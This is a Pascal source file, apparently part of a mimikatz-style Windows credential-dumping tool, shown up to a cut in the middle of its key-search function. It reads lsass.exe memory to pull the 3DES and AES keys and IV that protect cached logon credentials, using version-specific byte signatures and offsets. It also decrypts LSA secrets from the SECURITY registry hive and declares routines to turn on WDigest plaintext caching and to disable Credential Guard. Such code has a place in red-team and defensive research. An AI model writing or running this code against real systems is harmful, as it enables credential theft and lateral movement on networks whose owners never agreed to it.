unit uLSA;

{$mode objfpc}{$H+}

interface

uses
  windows,Classes, SysUtils,dos,
  ucryptoapi,utils,upsapi,umemory,udebug,ntdll,uhandles,jwanative;

function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;

function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
function NtCreateProcessEx(ProcessHandle : PHANDLE;
                                     DesiredAccess: ACCESS_MASK;
                                     ObjectAttributes: POBJECT_ATTRIBUTES;
                                     InheritFromProcessHandle: DWORD;
                                     InheritHandles: DWORD;
                                     SectionHandle: DWORD;
                                     DebugPort: DWORD;
                                     ExceptionPort: DWORD;
                                     dwSaferFlags: DWORD): NTSTATUS; stdcall; external 'ntdll.dll';
function wdigest(pid:dword):boolean;
function wdigest_UseLogonCredential(pid:dword):boolean;
function wdigest_DisableCredGuard(pid:dword):boolean;

function dpapi(pid:dword;save:boolean=false):boolean;

function lsa_get_secret(server:string;key:string;var output:tbytes):boolean;
function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
//function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;

var
  deskey,aeskey,iv:tbytes;
  lsass_handle:thandle=thandle(-1);

implementation

type _LUID =record
     LowPart:DWORD;
     HighPart:LONG;
end;

type
  //{$PackRecords 8}
PLSA_UNICODE_STRING=^LSA_UNICODE_STRING;
_LSA_UNICODE_STRING = record
  Length: USHORT;          //2
  MaximumLength: USHORT;   //2
  {$ifdef CPU64}dummy:dword;{$endif cpu64}   //align to 8 bytes
  Buffer: PWIDECHAR;
  //{$PackRecords default}
end;
LSA_UNICODE_STRING = _LSA_UNICODE_STRING;





type
  _LSA_OBJECT_ATTRIBUTES = record
  Length: ULONG;
  RootDirectory: HANDLE;
  ObjectName: PLSA_UNICODE_STRING;
  Attributes: ULONG;
  SecurityDescriptor: PVOID; // Points to type SECURITY_DESCRIPTOR
  SecurityQualityOfService: PVOID; // Points to type SECURITY_QUALITY_OF_SERVICE
end;
LSA_OBJECT_ATTRIBUTES = _LSA_OBJECT_ATTRIBUTES;

type LSA_HANDLE = PVOID;


function _LsaStorePrivateData(PolicyHandle: LSA_HANDLE;
  const KeyName: pointer; PrivateData: pointer): NTSTATUS; stdcall;
external 'advapi32.dll' name 'LsaStorePrivateData';

function _LsaRetrievePrivateData(PolicyHandle: LSA_HANDLE;
  const KeyName: LSA_UNICODE_STRING; var PrivateData: pointer): NTSTATUS; stdcall;
external 'advapi32.dll' name 'LsaRetrievePrivateData';

function _LsaOpenPolicy(SystemName: PLSA_UNICODE_STRING;
  var ObjectAttributes: LSA_OBJECT_ATTRIBUTES; DesiredAccess: ACCESS_MASK;
  var PolicyHandle: LSA_HANDLE): NTSTATUS; stdcall;
external 'advapi32.dll' name 'LsaOpenPolicy';

function _LsaClose(ObjectHandle: LSA_HANDLE): NTSTATUS; stdcall;
external 'advapi32.dll' name 'LsaClose';


type _KIWI_MASTERKEY_CACHE_ENTRY =record
	Flink:nativeuint;
	Blink:nativeuint;
	LogonId:_LUID;
	KeyUid:GUID;
	insertTime:FILETIME; //or LARGE_INTEGER
	keySize:ULONG;
	key:array [0..127] of byte;
end;
KIWI_MASTERKEY_CACHE_ENTRY=_KIWI_MASTERKEY_CACHE_ENTRY;
PKIWI_MASTERKEY_CACHE_ENTRY=^KIWI_MASTERKEY_CACHE_ENTRY;

{$ifdef CPU64}
type i_logsesslist=record
     next:nativeuint;
     prev:nativeuint;
     usagecount:nativeuint;
     this:nativeuint;
     luid:nativeuint;
     unk1:nativeuint;
     //a lsa unicode string
     len1:word;
     maxlen1:word;
     unk2:dword;
     usernameptr:nativeuint;
     //a lsa unicode string
     len2:word;
     maxlen2:word;
     unk3:dword;
     domainptr:nativeuint;
     //a lsa unicode string
     len3:word;
     maxlen3:word;
     unk4:dword;
     passwordptr:nativeuint; //??
     end;
  {$endif CPU64}

  {$ifdef CPU32}
  //works at least on win7 32 bits...
  type i_logsesslist=record
       next:nativeuint;
       prev:nativeuint;
       usagecount:nativeuint;
       this:nativeuint;
       luid:nativeuint;
       unk1:nativeuint;
       unk2:nativeuint;
       unk3:nativeuint;
       //minmax1:nativeuint;
       len1:word;
       maxlen1:word;
       usernameptr:nativeuint;
       //minmax2:nativeuint;
       len2:word;
       maxlen2:word;
       domainptr:nativeuint;
       //minmax3:nativeuint;
       len3:word;
       maxlen3:word;
       passwordptr:nativeuint; //??
       end;
    {$endif CPU32}

type
  _KIWI_HARD_KEY =record
	cbSecret:ULONG;
	data:array[0..59] of byte // etc...
    end;
 KIWI_HARD_KEY=_KIWI_HARD_KEY;

 _KIWI_BCRYPT_KEY =record
 	size:ULONG;
 	tag:array [0..3] of char;	// 'MSSK'
 	type_:ULONG;
 	unk0:ULONG;
 	unk1:ULONG;
 	bits:ULONG;
 	hardkey:KIWI_HARD_KEY;
        end;
  KIWI_BCRYPT_KEY=_KIWI_BCRYPT_KEY;
  PKIWI_BCRYPT_KEY=^KIWI_BCRYPT_KEY;

     _KIWI_BCRYPT_KEY81 =record
	 size:ulong;
	 tag:array [0..3] of char;	// 'MSSK'
	 type_:ulong;
	 unk0:ulong;
	 unk1:ulong;
	 unk2:ulong;
	 unk3:ulong;
	 unk4:ulong;
	 unk5:pointer;	// before, align in x64
	 unk6:ulong;
	 unk7:ulong;
	 unk8:ulong;
	 unk9:ulong;
         //
	 hardkey:KIWI_HARD_KEY;
        end;
     KIWI_BCRYPT_KEY81=_KIWI_BCRYPT_KEY81 ;
     PKIWI_BCRYPT_KEY81=^KIWI_BCRYPT_KEY81;

     _KIWI_BCRYPT_HANDLE_KEY =record
	size:ulong;
	tag:array [0..3] of char;	// 'UUUR'
	hAlgorithm:pointer;
	key:pointer; // PKIWI_BCRYPT_KEY81; or PKIWI_BCRYPT_KEY; depending on OS...
	unk0:pointer;
        end;
     KIWI_BCRYPT_HANDLE_KEY=_KIWI_BCRYPT_HANDLE_KEY;

Procedure LsaInitUnicodeString(Var LsaString: LSA_UNICODE_STRING; Const WS: WideString);
Begin
  FillChar(LsaString, SizeOf(LsaString), 0);
  If WS <> '' Then
  Begin
    LsaString.Length:=Length(WS) * SizeOf(WideChar);
    LsaString.MaximumLength:=LsaString.Length + SizeOf(WideChar);
    LsaString.Buffer:=PWideChar(WS);
  End;
End;

     procedure CreateFromStr (var value:LSA_UNICODE_STRING; st : string);
     var
       len : Integer;
       wst : WideString;
     begin
       len := Length (st);
       Value.Length := len * sizeof (WideChar);
       Value.MaximumLength := (len + 1) * sizeof (WideChar);
       GetMem (Value.buffer, sizeof (WideChar) * (len + 1));
       wst := st;
       lstrcpyw (Value.buffer, PWideChar (wst))
     end;



function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;
var
  ret:boolean;
  cbdata:dword;
  data,clearsecret,secret,system_key,key:tbytes; //array[0..1023] of byte;
begin
  result:=false;
  log('**** dumpsecret ****');
  //we should check PolRevision first to decide nt5 vs nt6
  //but also PolEKList" vs "PolSecretEncryptionKey
  ret:=MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\PolEKList'),pchar(''),data);
  if ret then
  begin
    log('MyRegQueryValue OK',0);
    cbdata:=length(data);
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
     //lets decode this encrypted secret stored in the registry
     if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then
       begin
       log('lsadump_sec_aes256 OK',0);
       //get clearsecret
       cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
       setlength(clearsecret,cbdata);
       copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
       log('clearsecret:'+ByteToHexaString (clearsecret));
       log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
       //retrieve secret field from clearsecret
       setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
       copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
       log('secret:'+ByteToHexaString (secret));
       //_NT6_SYSTEM_KEYS
       //only one key supported for now
       log('nbKeys:'+inttostr(PNT6_SYSTEM_KEYS(@secret[0])^.nbKeys)) ;
       setlength(system_key,1024);
       copymemory(@system_key[0],@secret[sizeof(dword)*3+sizeof(guid)],length(secret));
       log('KeyId:'+GUIDToString(PNT6_SYSTEM_KEY(@system_key[0])^.KeyId )) ;
       setlength(key,PNT6_SYSTEM_KEY(@system_key[0])^.KeySize );
       copymemory(@key[0],@system_key[sizeof(dword)*2+sizeof(guid)],length(key));
       //log('Key:'+ByteToHexaString(@PNT6_SYSTEM_KEY(@system_key[0])^.Key[0],PNT6_SYSTEM_KEY(@system_key[0])^.KeySize ),1);
       log('Key:'+ByteToHexaString(key));
       end; //if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then

    //if we got a system key, lets decrypt a secret stored in the registry
    if length(system_key)>0 then
      begin
      if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\secrets\'+regkey+'\CurrVal'),pchar(''),data) then
        begin
        log('MyRegQueryValue OK',0);
         cbdata:=length(data);
         log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
         log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
         //at least in nt6 case, we should match the hardsecret blob guid with the key guid...
         //lets cheat for now and push the first supposedly system key
         //rather we should push the system keyS aka @secrets[0] above
         if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
                begin
                log('lsadump_sec_aes256 OK',0);
                //get clearsecret
                cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
                setlength(clearsecret,cbdata);
                copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
                log('clearsecret:'+ByteToHexaString (clearsecret));
                log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
                //retrieve secret field from clearsecret
                setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
                copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
                log('secret:'+ByteToHexaString (secret));
                setlength(output,length(secret));
                CopyMemory(@output[0],@secret[0],length(secret));
                result:=true;
                end; //if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
         end;//MyRegQueryValue
      end;//if length(key)>0 then

  end //MyRegQueryValue
  else log('MyRegQueryValue failed:'+inttostr(getlasterror));
log('**** dumpsecret:'+BoolToStr (result)+' ****');
end;

{
As described in Private Data Object, private data objects include three specialized types:
local, global, and machine. Specialized objects are identified by a prefix in the key name:
"L$" for local objects,"G$" for global objects,and "M$" for machine objects.
Local objects cannot be accessed remotely. Machine objects can be accessed only by the operating system.
}
function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
const
POLICY_GET_PRIVATE_INFORMATION = 4 ;
POLICY_TRUST_ADMIN = 8 ;
POLICY_CREATE_ACCOUNT = 16 ;
POLICY_CREATE_SECRET = 32 ;
POLICY_CREATE_PRIVILEGE = 64 ;
var
  oa                : LSA_OBJECT_ATTRIBUTES;
  hPolicy           : LSA_HANDLE;
  usServer          : LSA_UNICODE_STRING;
  usKeyName         : LSA_UNICODE_STRING;
  usPassWord        : LSA_UNICODE_STRING;
  Status            : NTSTATUS;
begin
  ZeroMemory(@oa, sizeof(oa));
  oa.Length := sizeof(oa);
  try
    if server<>'' then
    begin
    CreateFromStr(usServer, Server);
    Status := _LsaOpenPolicy(@usServer, oa, POLICY_CREATE_SECRET, hPolicy);
    end
    else Status := _LsaOpenPolicy(nil, oa, POLICY_CREATE_SECRET, hPolicy);
    if status=ERROR_SUCCESS then
    begin
      CreateFromStr(usKeyName, KeyName);
      CreateFromStr(usPassWord, Password);
      Status := _LsaStorePrivateData(hPolicy, @usKeyName, @usPassword);
    end;
  finally
    _LsaClose(hPolicy);
  end;
  Result := Status=ERROR_SUCCESS;
end;


function lsa_get_secret(server:string;key:string;var output:tbytes):boolean;
const
  POLICY_ALL_ACCESS = $00F0FFF;
var
  Status: NTSTATUS;
  lObjectAttributes: LSA_OBJECT_ATTRIBUTES;
  PrivateData,secret:LSA_UNICODE_STRING ;
  data:PLSA_UNICODE_STRING =nil;
  pol:LSA_HANDLE ;
  ustr_server : _LSA_UNICODE_STRING;
begin
  result:=false;
log('Server:'+server);
log('Key:'+key);

ZeroMemory(@lObjectAttributes, sizeof(lObjectAttributes));
//writeln('sizeof(lObjectAttributes):'+inttostr(sizeof(lObjectAttributes)));
//writeln('sizeof(LSA_UNICODE_STRING):'+inttostr(sizeof(LSA_UNICODE_STRING))); //{$align 8} needed for x64

if server<>'' then
       begin
       CreateFromStr (ustr_server,server);
       Status := _LsaOpenPolicy(@ustr_server, lObjectAttributes, POLICY_ALL_ACCESS{POLICY_GET_PRIVATE_INFORMATION}{0}, pol);
       //ReallocMem (unicode_domain.Buffer, 0);
       end
       else  Status := _LsaOpenPolicy(nil, lObjectAttributes, POLICY_ALL_ACCESS{POLICY_GET_PRIVATE_INFORMATION}{0}, pol);



log('_LsaOpenPolicy ok');
if ( status<>ERROR_SUCCESS ) then
   begin
		log('LsaOpenPolicy error:'+inttohex(status,sizeof(status)),1);
                exit;
   end;


CreateFromStr(secret,key);
CreateFromStr(PrivateData,'password');

try

status:=_LsaRetrievePrivateData(pol,secret,data); //works in 32 bits
//status:=LsaStorePrivateData(pol,@secret,@PrivateData); //works in 32bits
log('LsaRetrievePrivateData ok');
except
on e:exception do log('LsaRetrievePrivateData:'+e.Message )
end;

if ( status<>ERROR_SUCCESS ) then
   begin
                //C0020023 RPC_NT_INVALID_BOUND
                //c0030005 RPC_NT_SS_CONTEXT_MISMATCH
                //C0030009 RPC_NT_NULL_REF_POINTER
                //C000000D STATUS_INVALID_PARAMETER from ntstatus.h file
		log('LsaRetrievePrivateData error:'+inttohex(status,sizeof(status)),1);
                exit;
   end
   else
   begin
   log('data^.Length:'+inttostr(data^.Length));
   if ( data<>nil) and (data^.Buffer <>nil) and (data^.Length>0 ) then
   	begin
   	log(strpas(data^.buffer),0);
        SetLength(output ,data^.Length);
        CopyMemory(@output [0],data^.Buffer,data^.Length) ;
        result:=true;
   	end
   	else  log('no data',0);

   end;

   status:=_LsaClose(pol);
   log('_LsaClose ok');
if ( status<>ERROR_SUCCESS ) then
   begin
		log('_LsaClose error:'+inttohex(status,sizeof(status)),1);
                exit;
   end;



end;

//using bcrypt functions
 function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
     const
       BCRYPT_AES_ALGORITHM                    = 'AES';
       BCRYPT_3DES_ALGORITHM                   = '3DES';
     var
       cbIV,i:ulong;
       status:ntstatus;
       tempiv:tbytes;
     begin
     log('**** encryptLSA ****');
       //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
     setlength(encrypted,length(decrypted));
     for i:=0 to length(encrypted)-1 do encrypted[i]:=0;

       if (cbMemory mod 8)<>0 then     //multiple of 8
     	begin
     		//hKey = &kAes.hKey;
     		cbIV := sizeof(iv);
                     log('cbmemory:'+inttostr(cbmemory));
                     log('aes decrypted:'+ByteToHexaString (decrypted));
                     setlength(tempiv,length(iv));
                     copymemory(@tempiv[0],@iv[0],length(tempiv));
                     if bencrypt(BCRYPT_AES_ALGORITHM,decrypted,@encrypted[0],aeskey,tempiv)>0 then result:=true;

             end
     	else
     	begin
     		//hKey = &k3Des.hKey;
     		cbIV := sizeof(iv) div 2;
                     log('cbmemory:'+inttostr(cbmemory));
                     log('des decrypted:'+ByteToHexaString (decrypted));
                     setlength(tempiv,length(iv));
                     copymemory(@tempiv[0],@iv[0],length(tempiv));
                     if bencrypt(BCRYPT_3DES_ALGORITHM,decrypted,@encrypted[0],deskey,tempiv)>0 then result:=true;
             end;

     end;

 //using bcrypt functions
function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
const
  BCRYPT_AES_ALGORITHM                    = 'AES';
  BCRYPT_3DES_ALGORITHM                   = '3DES';
var
  cbIV,i:ulong;
  status:ntstatus;
  tempiv:tbytes;
  len:ulong;
  buffer:array of byte;
begin
log('**** decryptLSA ****');
  log('length(decrypted):'+inttostr(length(decrypted)));
  //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
  if length(decrypted)>0 then for i:=0 to length(decrypted)-1 do decrypted[i]:=0;
  //
  setlength(buffer,cbmemory );
  CopyMemory (@buffer[0],@encrypted [0],cbmemory );
  //
  if (cbMemory mod 8)<>0 then     //multiple of 8
	begin
		//hKey = &kAes.hKey;
		cbIV := sizeof(iv);
                log('cbmemory:'+inttostr(cbmemory));
                log('aes encrypted:'+ByteToHexaString (buffer));
                setlength(tempiv,length(iv));
                copymemory(@tempiv[0],@iv[0],length(tempiv));
                len:= bdecrypt(BCRYPT_AES_ALGORITHM,buffer,@decrypted[0],aeskey,tempiv);
                //if len<length(decrypted) then setlength(decrypted,len);
                result:=len>0;

        end
	else
	begin
		//hKey = &k3Des.hKey;
		cbIV := sizeof(iv) div 2;
                log('cbmemory:'+inttostr(cbmemory));
                log('des encrypted:'+ByteToHexaString (buffer));
                setlength(tempiv,length(iv));
                copymemory(@tempiv[0],@iv[0],length(tempiv));
                len:= bdecrypt(BCRYPT_3DES_ALGORITHM,buffer,@decrypted[0],deskey,tempiv);
                //if len<length(decrypted) then setlength(decrypted,len);
                result:=len>0;
        end;
        //log('length(decrypted):'+inttostr(length(decrypted)));
        //log('decrypted:'+ByteToHexaString  (decrypted ));
end;

function extractlsakeys(pid:dword;ivOffset,desOffset,aesOffset:int64;var DesKey,aeskey,iv:tbytes):boolean;
var
  hprocess:thandle;
  keyPointer:nativeuint;
  h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
  extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
  extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
begin
log('**** extractlsakeys ****');
result:=false;
//
hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                      false,pid);
//IV
setlength(iv,16);
if ReadMem(hprocess, ivoffset, @iv[0], 16)=false then begin log('cannot read memory');exit; end;
log('IV:'+ByteToHexaString (IV));
//
// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writeln('readmem=false');
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
log('TAG:'+strpas(h3DesKey.tag ));
// Read in the 3DES key
log('DES:');
if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
   begin
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
   log('DESKey:'+ByteToHexaString(deskey));
   end
   else
   begin
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
   log('KIWI_BCRYPT_KEY:'+strpas(extracted3DesKey.tag ));
   setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
   log('DESKey:'+ByteToHexaString(deskey));
   end;
//
// Retrieve pointer to h3AesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
// Read in AES key
log('AES:');
if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
   begin
   if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
   log('AESKey:'+ByteToHexaString(aesKey));
   end
   else
   begin
   ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
   log('BCRYPT_KEYTAG:'+strpas(extractedAesKey.tag ));
   setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
   log('AESKey:'+ByteToHexaString(aesKey));
   end;
//
CloseHandle(hprocess);
//
result:=true;
end;

function findlsakeys_sym(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
var
  module:string='lsasrv.dll';
  ivOffset,desOffset,aesOffset:nativeuint; //int64;
  hmod:thandle;
begin
log('**** findlsakeys_sym ****');
result:=false;
ivOffset:=0;desOffset:=0;aesOffset:=0;

try
       if _SymFromName (strpas(sysdir)+'\'+module,'InitializationVector',ivOffset)
          then
             begin
             log('_SymFromName:'+inttohex(ivOffset,sizeof(ivOffset)));
             end
             else log('_SymFromName:failed');
       if _SymFromName (strpas(sysdir)+'\'+module,'h3DesKey',desOffset)
          then
             begin
             log('_SymFromName:'+inttohex(desOffset,sizeof(desOffset)));
             end
             else log('_SymFromName:failed');
       if _SymFromName (strpas(sysdir)+'\'+module,'hAesKey',aesOffset)
          then
             begin
             log('_SymFromName:'+inttohex(aesOffset,sizeof(aesOffset)));
             end
             else log('_SymFromName:failed');
       except
       on e:exception do log(e.Message );
       end;

if (ivOffset=0) or (desOffset=0) or (aesOffset=0) then exit;

//relative offset to virtual relative offset
//might be easier to simply call loadlibrary and add base address to the relative offset...
//rather than caller search_module_mem
hmod:=LoadLibrary (pchar(module));
ivoffset:=hmod+ivoffset;
desOffset:=hmod+desOffset;
aesOffset:=hmod+aesOffset;
log('ivoffset:'+inttohex(ivoffset,sizeof(nativeint)));
log('desOffset:'+inttohex(desOffset,sizeof(nativeint)));
log('aesOffset:'+inttohex(aesOffset,sizeof(nativeint)));
freelibrary(hmod);
//
result:=extractlsakeys (pid,ivOffset,desOffset ,aesOffset,deskey,aeskey,iv);


end;


function callback2(param:pointer=nil):dword;stdcall;
var
  lpszProcess : PChar;
  size:dword;
  h:thandle;
begin
//log('callback');
//do something with duplicatedobject ...
//log('param:'+inttohex(nativeuint(param),sizeof(param)));
if param=nil then exit;
h:=thandle(param^);
//log('handle:'+inttohex(h,sizeof(thandle)));
//it should be the responsibility of the callback to close the duplicated handle
lpszProcess := AllocMem(MAX_PATH);
size:=MAX_PATH;
if QueryFullProcessImageNameA(h,0,lpszProcess ,@size)=true then
begin
     log(strpas(lpszProcess));
     if pos('lsass.exe',strpas(lpszProcess))>0
     then lsass_handle:=h
     else if h<>thandle(-1) then closehandle(h);
end
else
begin
     log('QueryFullProcessImageNameA NOK,'+inttostr(getlasterror));
     if h<>thandle(-1) then closehandle(h);
end
end; //function callback(param:thandle):dword;stdcall;


//dd lsasrv!LsaInitializeProtectedMemory
//dd lsasrv!h3DesKey
//dd lsasrv!hAesKey
//dd lsasrv!InitializationVector
function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
const
 //win7
 PTRN_WNO8_LsaInitializeProtectedMemory_KEY:array[0..12] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4c, $24, $48, $48, $8b, $0d);
 PTRN_WIN8_LsaInitializeProtectedMemory_KEY:array[0..11] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4d, $d8, $48, $8b, $0d);
 //KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
 PTRN_WN10_LsaInitializeProtectedMemory_KEY:array[0..15] of byte=  ($83, $64, $24, $30, $00, $48, $8d, $45, $e0, $44, $8b, $4d, $d8, $48, $8d, $15);
 PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
var
 module:string='lsasrv.dll';
 pattern:array of byte;
 IV_OFFSET:ShortInt=0 ; //signed byte
 DES_OFFSET:ShortInt=0 ; //signed byte
 AES_OFFSET:ShortInt=0 ; //signed byte
 hmod:thandle=0;
 MODINFO:  MODULEINFO;
 keySigOffset:nativeuint;
 hprocess:thandle=-1;
 hprocess2:thandle=-1;
 hmods:array[0..1023] of thandle;
 cbneeded,count:dword;
 szModName:array[0..254] of char;
 dummy:string;
 lsasrvMem:nativeuint;
 ivOffset,desOffset,aesOffset,keyPointer:nativeuint;
 h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
 extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
 extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
 //extracted3DesKey:pointer;
 i:byte;
 objectTypeInfo:pointer;
 status:ntstatus;
 dwSize     :DWORD;
 oa:TObjectAttributes;
cid:CLIENT_ID ;
clone: thandle;
lib2:integer;
begin
log('**** findlsakeys ****');
  result:=false;
 (*
  //mio
  log('mio',1);
  lib2:=loadlibrary('ntdll.dll');
    hprocess:=openprocess(PROCESS_CREATE_PROCESS, False, pid);
    writeln('[+] Process Handle: '+hprocess.ToString());
    if hprocess<>thandle(-1) then
     begin
      writeln('opened hprocess');
      ZeroMemory(@clone,sizeof(clone));
      writeln('zeromemory ok');
      status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,hprocess,0,0,0,0,0);
      write('cloned to handle: ');
      writeln(clone);

     end
    else begin
          writeln('failed ntcreateprocess ulsa');
          exit;
         end;
  //mio
 *)
  //if symmode =true then begin result:=findlsakeys_sym (clone,DesKey ,aeskey ,iv);exit;end;
  if symmode =true then begin result:=findlsakeys_sym (pid,DesKey ,aeskey ,iv);exit;end;
  writeln('_sym');
  // OS detection
if lowercase(osarch) ='x86' then
   begin
   setlength(pattern,5);
   CopyMemory(@pattern[0],@PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86[0],5);
   IV_OFFSET:=5 ; DES_OFFSET:=-76 ; AES_OFFSET:=-21 ; //tested on win7
   end;
if lowercase(osarch) ='amd64' then
   begin
   if copy(winver,1,3)='6.1' then //win7
      begin
      setlength(pattern,sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WNO8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET := 59; DES_OFFSET := -61; AES_OFFSET := 25;
      end;
   if copy(winver,1,3)='6.3' then //win8
      begin
      setlength(pattern,sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WIN8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET:=62 ; DES_OFFSET:=-70 ; AES_OFFSET:=23 ;  //tested on win8
      end;
   if copy(winver,1,3)='10.' then //win10
      begin
      setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET:=61 ; DES_OFFSET:=-73 ; AES_OFFSET:=16 ; //tested on 1709
      end;
   if (pos('-1809',winver)>0) or (pos('-1903',winver)>0) or (pos('-1909',winver)>0)
      or (pos('-2004',winver)>0)
      or (pos('-20H2',winver)>0) or (pos('-21H1',winver)>0)
      or (pos('-22H2',winver)>0)
      or (pos('-21H2',winver)>0) //win 11
      then //win10 1809+
      begin
      setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET:=67 ; DES_OFFSET:=-89 ; AES_OFFSET:=16 ;
      //{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
      end;
   end;
if IV_OFFSET=0 then
   begin
   log('no offset defined for this OS',1);
   exit;
   end;
log('IV_OFFSET:'+inttostr(IV_OFFSET));
log('DES_OFFSET:'+inttostr(DES_OFFSET));
log('AES_OFFSET:'+inttostr(AES_OFFSET));
//*************************
//lets search keySigOffset "offline" i.e NOT in lsass.exe
writeln('offline in');
hmod:=loadlibrary(pchar(module));
log('hMod:'+inttohex(hmod,sizeof(pointer)),0);
fillchar(MODINFO,sizeof(MODINFO),0);
GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
